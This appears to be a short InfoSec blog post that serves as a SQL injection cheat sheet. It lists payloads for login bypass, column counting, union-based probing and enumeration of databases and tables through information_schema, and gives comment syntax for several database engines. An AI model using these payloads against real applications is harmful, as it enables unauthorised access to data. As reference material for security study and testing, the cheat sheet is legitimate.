---
layout: single
title: SQL Injection
excerpt: "Deep dive into SQL Injection."
date: 2022-11-26
classes: wide
header:
  teaser: /assets/images/aws-logo.png
  teaser_home_page: true
  icon: /assets/images/aws-logo.png
categories:
  - InfoSec
tags: 
  - InfoSec
  - SQLI
---
## General Injections
`' or 1=1-- -`
`'order by 7'`
`' union select NULL,NULL,NULL-- -`
`category=Pets' union select schema_name, NULL from information_schema.schemata-- -`: List DBs
`category=Pets' union select table_name, NULL from information_schema.tables where table_schema='public'-- -`: List tables


## Comments

Oracle 	    --comment

Microsoft 	--comment
            /*comment*/

PostgreSQL 	--comment
            /*comment*/

MySQL 	    #comment
            -- comment [Note the space after the double dash]
